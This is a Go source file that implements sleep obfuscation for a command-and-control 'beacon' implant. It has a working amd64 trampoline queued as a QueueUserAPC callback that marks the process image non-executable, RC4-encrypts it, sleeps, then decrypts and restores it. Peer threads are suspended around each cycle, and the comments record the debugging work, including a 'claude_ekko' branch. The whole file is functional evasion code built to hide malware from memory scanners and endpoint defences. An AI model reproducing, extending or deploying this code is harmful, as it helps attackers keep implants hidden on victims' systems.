// Package apc implements sleep obfuscation via a QueueUserAPC-driven
// encrypt/sleep/decrypt sequence running on the beacon's own thread,
// with a minimal peer-thread suspension pass around it to prevent Go
// runtime threads from faulting on the encrypted image.
//
// Design summary
//
// This replaces the older Ekko-based sleep obfuscation, which was
// fundamentally incompatible with Go's runtime. See the claude_ekko
// branch and the postmortem in that commit history for the details.
//
// The core encrypt-sleep-decrypt cycle runs from a hand-written amd64
// trampoline placed in a VirtualAlloc'd RWX region OUTSIDE the process
// image. Because the trampoline sits in a separate allocation and only
// calls into ntdll/kernel32/advapi32 (never back into the encrypted Go
// .text), it runs cleanly through the encrypted window on the same
// thread that queued it as an APC.
//
// BUT: with the image un-executable, any OTHER Go M (sysmon,
// netpoller, GC worker, timer callback) that happens to fetch an
// instruction from .text during the encrypted window will AV and take
// the process down. That is the crash we saw on the first attempt at
// this design without any peer-thread management.
//
// Fix: before entering the alertable wait, snapshot threads and
// SuspendThread every image-based peer, then briefly delay to let the
// kernel commit the suspensions before the trampoline touches memory.
// After the wait returns, ResumeThread each peer (draining any
// accumulated suspend count from Go's own async-preemption).
//
// We deliberately do NOT do the things that made Ekko fragile:
//   - No CreateTimerQueue / NtContinue ROP hijack — everything runs
//     as a single APC on our own thread.
//   - No GetThreadContext after SuspendThread — that call has no
//     timeout and hung whenever a target was suspended mid-kernel-
//     transition. We replace it with a fixed short NtDelayExecution.
//   - No repeated Ekko-style syscall churn per peer — just one
//     SuspendThread and one ResumeThread(-drain) each, per cycle.
//
// See the claude_ekko postmortem for why each of the above matters.
package apc

import (
	"crypto/rand"
	"errors"
	"fmt"
	"runtime"
	"sync/atomic"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

const (
	pageReadWrite        uintptr = 0x04
	pageExecuteReadWrite uintptr = 0x40

	memCommit  uintptr = 0x1000
	memReserve uintptr = 0x2000
	memRelease uintptr = 0x8000

	// NtQueryInformationThread information class for the thread's
	// user-mode start address (used to filter peer threads to only those
	// that started inside our image — i.e. Go runtime Ms, not thread-pool
	// workers or third-party threads).
	threadQuerySetWin32StartAddress uintptr = 0x9

	// Milliseconds to sleep between the suspend pass and the APC.
	// SuspendThread is asynchronous; the kernel needs a moment to commit
	// each suspension. GetThreadContext would block until commit but has
	// no timeout — we use a fixed short delay instead.
	commitDelayMs int64 = 5

	// ResumeThread drain cap: no thread should legitimately reach 32
	// stacked suspensions; this is a runaway backstop.
	maxResumeDrain = 32

	// DWORD (uint32) representation of -1, cast to uintptr. SuspendThread
	// and ResumeThread return DWORD; on failure they return (DWORD)-1
	// which zero-extends to 0x00000000FFFFFFFF in a 64-bit register, NOT
	// 0xFFFFFFFFFFFFFFFF.
	dwordMinusOne uintptr = 0xFFFFFFFF
)

var (
	kernel32             = syscall.NewLazyDLL("kernel32.dll")
	procGetModuleHandleA = kernel32.NewProc("GetModuleHandleA")
	procVirtualAlloc     = kernel32.NewProc("VirtualAlloc")
	procVirtualFree      = kernel32.NewProc("VirtualFree")
	procVirtualProtect   = kernel32.NewProc("VirtualProtect")
	procQueueUserAPC     = kernel32.NewProc("QueueUserAPC")
	procSuspendThread    = kernel32.NewProc("SuspendThread")
	procResumeThread     = kernel32.NewProc("ResumeThread")

	ntdll                        = syscall.NewLazyDLL("ntdll.dll")
	procNtDelayExecution         = ntdll.NewProc("NtDelayExecution")
	procNtWaitForSingleObject  = ntdll.NewProc("NtWaitForSingleObject")
	procNtQueryInformationThread = ntdll.NewProc("NtQueryInformationThread")

	advapi32              = syscall.NewLazyDLL("Advapi32.dll")
	procSystemFunction032 = advapi32.NewProc("SystemFunction032")
)

// Cumulative counters. Exposed via Stats(). No behavior changes based on them.
var (
	cyclesTotal atomic.Uint64
	errorsTotal atomic.Uint64
)

// Stats returns (cycles, errors) counters since process start. Useful for
// beacon telemetry to detect a host on which APC-based sleep is failing.
func Stats() (cycles, errors uint64) {
	return cyclesTotal.Load(), errorsTotal.Load()
}

// ustring matches the informal SystemFunction032 argument type
// (ULONG Length, ULONG MaximumLength, PVOID Buffer). It is used as the
// data-and-key descriptor for the in-place RC4 encryption.
type ustring struct {
	Length        uint32
	MaximumLength uint32
	Buffer        uintptr
}

// imageNTHeaders64Prefix is enough of IMAGE_NT_HEADERS64 to read SizeOfImage.
// Field order is exactly the PE spec; alignment matches natural layout.
type imageNTHeaders64Prefix struct {
	Signature uint32
	// IMAGE_FILE_HEADER (20 bytes)
	Machine              uint16
	NumberOfSections     uint16
	TimeDateStamp        uint32
	PointerToSymbolTable uint32
	NumberOfSymbols      uint32
	SizeOfOptionalHeader uint16
	Characteristics      uint16
	// IMAGE_OPTIONAL_HEADER64 (partial)
	Magic                       uint16
	MajorLinkerVersion          uint8
	MinorLinkerVersion          uint8
	SizeOfCode                  uint32
	SizeOfInitializedData       uint32
	SizeOfUninitializedData     uint32
	AddressOfEntryPoint         uint32
	BaseOfCode                  uint32
	ImageBase                   uint64
	SectionAlignment            uint32
	FileAlignment               uint32
	MajorOperatingSystemVersion uint16
	MinorOperatingSystemVersion uint16
	MajorImageVersion           uint16
	MinorImageVersion           uint16
	MajorSubsystemVersion       uint16
	MinorSubsystemVersion       uint16
	Win32VersionValue           uint32
	SizeOfImage                 uint32
}

// apcArgs is the struct passed to the trampoline via QueueUserAPC's dwData.
//
// FIELD OFFSETS ARE HARD-CODED IN THE TRAMPOLINE MACHINE CODE. Do not
// reorder, resize, or insert fields without also updating the trampoline
// AND the init-time offset assertion below. A mismatch would produce a
// silent crash inside the encrypted window (unrecoverable).
type apcArgs struct {
	imageBase        uintptr // 0x00
	imageSize        uintptr // 0x08
	oldProt          uint32  // 0x10  (VirtualProtect out-param)
	_pad             uint32  // 0x14  (alignment to 8 for the ustring below)
	img              ustring // 0x18  (16 bytes)
	key              ustring // 0x28  (16 bytes)
	delayInterval    int64   // 0x38  (100-ns units, negative = relative)
	virtualProtect   uintptr // 0x40
	systemFunc032    uintptr // 0x48
	ntDelayExecution uintptr // 0x50
}

// trampoline is hand-written amd64 machine code invoked as a
// QueueUserAPC callback. On entry, RCX points to an apcArgs struct.
//
// Sequence (each call preserves RBX per Windows x64 ABI):
//
//	VirtualProtect(base, size, PAGE_READWRITE,          &oldProt)
//	SystemFunction032(&img, &key)                          // RC4 encrypt
//	NtDelayExecution(FALSE, &delayInterval)                // sleep
//	SystemFunction032(&img, &key)                          // RC4 decrypt (symmetric)
//	VirtualProtect(base, size, PAGE_EXECUTE_READWRITE,  &oldProt)
//	ret
//
// Byte-for-byte annotated:
var trampoline = []byte{
	// Prologue: save RBX, reserve 48 bytes (32 shadow + 16 spare).
	// Entry Rsp % 16 == 8 (call pushed 8-byte ret addr); after push rbx
	// it becomes 0; after sub rsp, 0x30 it stays 0 — properly aligned
	// for the calls that follow.
	0x53,                   // push rbx
	0x48, 0x83, 0xEC, 0x30, // sub rsp, 0x30
	0x48, 0x89, 0xCB,       // mov rbx, rcx           ; rbx = args ptr

	// VirtualProtect(base, size, PAGE_READWRITE, &oldProt)
	0x48, 0x8B, 0x4B, 0x00,             // mov rcx, [rbx+0x00]
	0x48, 0x8B, 0x53, 0x08,             // mov rdx, [rbx+0x08]
	0x41, 0xB8, 0x04, 0x00, 0x00, 0x00, // mov r8d, 0x04
	0x4C, 0x8D, 0x4B, 0x10,             // lea r9,  [rbx+0x10]
	0xFF, 0x53, 0x40,                   // call qword ptr [rbx+0x40]

	// SystemFunction032(&img, &key) -- encrypt
	0x48, 0x8D, 0x4B, 0x18, // lea rcx, [rbx+0x18]
	0x48, 0x8D, 0x53, 0x28, // lea rdx, [rbx+0x28]
	0xFF, 0x53, 0x48,       // call qword ptr [rbx+0x48]

	// NtDelayExecution(FALSE, &delayInterval)
	// Non-alertable: no other APCs can slip in between encrypt and decrypt.
	0x33, 0xC9,             // xor ecx, ecx
	0x48, 0x8D, 0x53, 0x38, // lea rdx, [rbx+0x38]
	0xFF, 0x53, 0x50,       // call qword ptr [rbx+0x50]

	// SystemFunction032(&img, &key) -- decrypt (RC4 is symmetric)
	0x48, 0x8D, 0x4B, 0x18, // lea rcx, [rbx+0x18]
	0x48, 0x8D, 0x53, 0x28, // lea rdx, [rbx+0x28]
	0xFF, 0x53, 0x48,       // call qword ptr [rbx+0x48]

	// VirtualProtect(base, size, PAGE_EXECUTE_READWRITE, &oldProt)
	0x48, 0x8B, 0x4B, 0x00,             // mov rcx, [rbx+0x00]
	0x48, 0x8B, 0x53, 0x08,             // mov rdx, [rbx+0x08]
	0x41, 0xB8, 0x40, 0x00, 0x00, 0x00, // mov r8d, 0x40
	0x4C, 0x8D, 0x4B, 0x10,             // lea r9,  [rbx+0x10]
	0xFF, 0x53, 0x40,                   // call qword ptr [rbx+0x40]

	// Epilogue
	0x48, 0x83, 0xC4, 0x30, // add rsp, 0x30
	0x5B,                   // pop rbx
	0xC3,                   // ret
}

func init() {
	// Resolve every Windows procedure we call at startup so a bad symbol
	// name fails loudly here instead of panicking on the first Sleep().
	// Learned the hard way — an "NtWaitForSingleObjectEx" typo (that
	// function does not exist in ntdll; the Ex suffix is Win32-only)
	// produced a silent 2-second crash on the first sleep cycle.
	for _, p := range []*syscall.LazyProc{
		procGetModuleHandleA, procVirtualAlloc, procVirtualFree,
		procVirtualProtect, procQueueUserAPC, procSuspendThread, procResumeThread,
		procNtDelayExecution, procNtWaitForSingleObject, procNtQueryInformationThread,
		procSystemFunction032,
	} {
		if err := p.Find(); err != nil {
			panic(fmt.Sprintf("apc: cannot resolve %s: %v", p.Name, err))
		}
	}

	// The trampoline references apcArgs fields by hard-coded byte offset.
	// Fail loudly at startup if Go's struct layout has drifted from what
	// the machine code expects — a mismatch here would produce a silent
	// crash inside the encrypted window at first Sleep() call.
	var a apcArgs
	mustOffset("imageBase",        unsafe.Offsetof(a.imageBase),        0x00)
	mustOffset("imageSize",        unsafe.Offsetof(a.imageSize),        0x08)
	mustOffset("oldProt",          unsafe.Offsetof(a.oldProt),          0x10)
	mustOffset("img",              unsafe.Offsetof(a.img),              0x18)
	mustOffset("key",              unsafe.Offsetof(a.key),              0x28)
	mustOffset("delayInterval",    unsafe.Offsetof(a.delayInterval),    0x38)
	mustOffset("virtualProtect",   unsafe.Offsetof(a.virtualProtect),   0x40)
	mustOffset("systemFunc032",    unsafe.Offsetof(a.systemFunc032),    0x48)
	mustOffset("ntDelayExecution", unsafe.Offsetof(a.ntDelayExecution), 0x50)
}

func mustOffset(name string, got, want uintptr) {
	if got != want {
		panic(fmt.Sprintf("apc: apcArgs.%s at offset 0x%X, expected 0x%X (trampoline drift)", name, got, want))
	}
}

// suspendImagePeers enumerates every thread in the current process whose
// user-mode start address falls inside our image (i.e. Go runtime Ms —
// sysmon, netpoller, GC workers, other beacon goroutines' Ms), skips the
// calling thread, and calls SuspendThread on the rest. Returns the list
// of TIDs actually suspended so they can be resumed one-for-one later.
//
// We DO NOT call GetThreadContext after SuspendThread — that syscall
// blocks until the kernel commits the suspension and has no timeout,
// which was the source of one of the Ekko-era hangs. Instead, callers
// should NtDelayExecution briefly after this returns to let the
// suspensions commit before touching memory the peers may be reading.
func suspendImagePeers(currentTID uint32, imageBase, imageEnd uintptr) ([]uint32, error) {
	hSnapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPTHREAD, 0)
	if err != nil {
		return nil, err
	}
	defer windows.CloseHandle(hSnapshot)

	var te windows.ThreadEntry32
	te.Size = uint32(unsafe.Sizeof(te))
	if err := windows.Thread32First(hSnapshot, &te); err != nil {
		return nil, err
	}

	currentPID := uint32(windows.GetCurrentProcessId())
	suspended := make([]uint32, 0, 32)

	for {
		if te.OwnerProcessID == currentPID && te.ThreadID != currentTID {
			hThread, openErr := windows.OpenThread(
				windows.THREAD_SUSPEND_RESUME|windows.THREAD_QUERY_INFORMATION,
				false, te.ThreadID,
			)
			if openErr == nil {
				var startAddr, retLen uintptr
				procNtQueryInformationThread.Call(
					uintptr(hThread),
					threadQuerySetWin32StartAddress,
					uintptr(unsafe.Pointer(&startAddr)),
					unsafe.Sizeof(startAddr),
					uintptr(unsafe.Pointer(&retLen)),
				)
				if startAddr >= imageBase && startAddr < imageEnd {
					r, _, _ := procSuspendThread.Call(uintptr(hThread))
					if r != dwordMinusOne {
						suspended = append(suspended, te.ThreadID)
					}
				}
				windows.CloseHandle(hThread)
			}
		}
		if err := windows.Thread32Next(hSnapshot, &te); err != nil {
			break
		}
	}
	return suspended, nil
}

// resumePeers iterates the TID list produced by suspendImagePeers and
// resumes each one, DRAINING the suspend count with a bounded loop.
// Go's sysmon can independently suspend the same M as part of async
// preemption; if it does so while our own SuspendThread is in effect,
// the counter can exceed 1 and a single ResumeThread call would leave
// the thread stuck. Draining until ResumeThread returns 1 (was last
// suspension) or 0 (wasn't suspended) fixes that.
//
// A failure to open a TID handle is intentionally swallowed — it means
// the thread has exited between the suspend pass and now, so there is
// nothing to resume. We must keep going through the rest of the list
// unconditionally.
func resumePeers(tids []uint32) {
	for _, tid := range tids {
		hThread, err := windows.OpenThread(windows.THREAD_SUSPEND_RESUME, false, tid)
		if err != nil {
			continue
		}
		for i := 0; i < maxResumeDrain; i++ {
			r, _, _ := procResumeThread.Call(uintptr(hThread))
			if r == 0 || r == 1 || r == dwordMinusOne {
				break
			}
		}
		windows.CloseHandle(hThread)
	}
}

// Sleep obfuscates the current process image for sleepMs milliseconds.
//
// See the package-level comment for the overall design. The important
// invariants for correctness are:
//
//   - runtime.LockOSThread pins the beacon goroutine to this M for the
//     entire duration, so the APC we queue is guaranteed to land on the
//     same thread that enters the alertable wait.
//   - The trampoline lives in a fresh VirtualAlloc'd RWX region that is
//     NOT part of the process image, so it survives the encryption pass.
//   - The trampoline never calls back into Go .text; every function it
//     invokes lives in ntdll / kernel32 / advapi32.
//   - The apcArgs struct is heap-allocated (escape analysis lifts it out
//     of the goroutine stack because we pass its address to unmanaged
//     code) so the trampoline can dereference it after we return control
//     to the alertable wait.
func Sleep(sleepMs uint64) error {
	if sleepMs == 0 {
		return nil
	}
	cyclesTotal.Add(1)

	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	// Image base and size — needed to know what to encrypt.
	imageBase, _, _ := procGetModuleHandleA.Call(0)
	if imageBase == 0 {
		errorsTotal.Add(1)
		return errors.New("apc: GetModuleHandleA returned NULL")
	}
	eLfaNew := *((*uint32)(unsafe.Pointer(imageBase + 0x3c)))
	nt := (*imageNTHeaders64Prefix)(unsafe.Pointer(imageBase + uintptr(eLfaNew)))
	imageSize := uintptr(nt.SizeOfImage)

	// Fresh RC4 key per cycle.
	var keyBuf [16]byte
	if _, err := rand.Read(keyBuf[:]); err != nil {
		errorsTotal.Add(1)
		return err
	}

	// Allocate the trampoline OUTSIDE the image mapping so that when the
	// image is encrypted the trampoline's own code is unaffected.
	tramp, _, _ := procVirtualAlloc.Call(
		0,
		uintptr(len(trampoline)),
		memCommit|memReserve,
		pageExecuteReadWrite,
	)
	if tramp == 0 {
		errorsTotal.Add(1)
		return errors.New("apc: VirtualAlloc for trampoline failed")
	}
	defer procVirtualFree.Call(tramp, 0, memRelease)

	copy(
		unsafe.Slice((*byte)(unsafe.Pointer(tramp)), len(trampoline)),
		trampoline,
	)

	// Heap-allocated args — pointer given to unmanaged code, so escape
	// analysis promotes it to the heap and stack moves cannot invalidate
	// the pointer while the APC is in flight.
	args := &apcArgs{
		imageBase: imageBase,
		imageSize: imageSize,
		img: ustring{
			Length:        uint32(imageSize),
			MaximumLength: uint32(imageSize),
			Buffer:        imageBase,
		},
		key: ustring{
			Length:        uint32(len(keyBuf)),
			MaximumLength: uint32(len(keyBuf)),
			Buffer:        uintptr(unsafe.Pointer(&keyBuf[0])),
		},
		// 100-ns units, negative sign = relative delay.
		delayInterval:    -int64(sleepMs) * 10_000,
		virtualProtect:   procVirtualProtect.Addr(),
		systemFunc032:    procSystemFunction032.Addr(),
		ntDelayExecution: procNtDelayExecution.Addr(),
	}

	// Real handle to self. The pseudo-handle from GetCurrentThread works
	// with QueueUserAPC in practice but is not documented as guaranteed;
	// take the safe path.
	currentTID := windows.GetCurrentThreadId()
	hSelf, err := windows.OpenThread(
		windows.THREAD_SET_CONTEXT|windows.THREAD_QUERY_INFORMATION,
		false,
		currentTID,
	)
	if err != nil {
		errorsTotal.Add(1)
		return err
	}
	defer windows.CloseHandle(hSelf)

	// -------- SUSPEND PEER GO Ms --------
	// The trampoline is about to strip the image's execute bit and encrypt
	// it. Any other thread that fetches an instruction from .text during
	// that window (Go's sysmon fires every ~20 ms; netpoller and GC
	// workers wake on demand) would AV and take the whole process down.
	// Freeze them for the duration of the cycle. All Go heap allocations
	// above this line have already run; below it we only make Windows
	// syscalls, so a suspended peer can't be holding a Go runtime lock
	// that we then wait on.
	imageEnd := imageBase + imageSize
	suspendedTIDs, err := suspendImagePeers(currentTID, imageBase, imageEnd)
	if err != nil {
		errorsTotal.Add(1)
		return err
	}

	// SuspendThread is asynchronous — give the kernel a moment to commit
	// each suspension before we start mutating the image. Without this,
	// a peer could still be executing an in-flight instruction when we
	// begin the RC4 pass. This is the deliberate replacement for the
	// GetThreadContext-after-SuspendThread trick, which had no timeout
	// and hung in the Ekko debugging campaign.
	commitDelay := -commitDelayMs * 10_000
	procNtDelayExecution.Call(0, uintptr(unsafe.Pointer(&commitDelay)))

	// Queue the APC. It will not be delivered until this thread enters an
	// alertable wait — which happens on the very next line.
	ret, _, _ := procQueueUserAPC.Call(
		tramp,
		uintptr(hSelf),
		uintptr(unsafe.Pointer(args)),
	)
	if ret == 0 {
		// Never entered the encrypted window — safe to resume immediately
		// and bail. Failing to resume peers here would leave the process
		// deadlocked with no way out.
		resumePeers(suspendedTIDs)
		errorsTotal.Add(1)
		return errors.New("apc: QueueUserAPC failed")
	}

	// Enter the alertable wait. The kernel notices the queued APC,
	// dispatches the trampoline (which runs the whole encrypt/sleep/
	// decrypt cycle synchronously), and returns STATUS_USER_APC when the
	// trampoline is done. We wait on the current-process handle because
	// NtWaitForSingleObject requires SOME valid handle and the process
	// handle never signals from inside the process — the wait can only
	// return via the APC completion path.
	//
	// Timeout=0 as a PLARGE_INTEGER argument means NULL, which the kernel
	// interprets as "wait indefinitely."
	procNtWaitForSingleObject.Call(
		uintptr(windows.CurrentProcess()),
		1, // Alertable = TRUE
		0, // Timeout = NULL (INFINITE)
	)

	// -------- RESUME PEER GO Ms --------
	// Image is decrypted and executable again; peers are safe to run.
	resumePeers(suspendedTIDs)

	// Keep the buffers referenced through the unmanaged execution above.
	// Go's escape analysis handles &args and &keyBuf, but an explicit
	// KeepAlive documents the invariant and is defensive against future
	// compiler changes.
	runtime.KeepAlive(keyBuf)
	runtime.KeepAlive(args)

	return nil
}
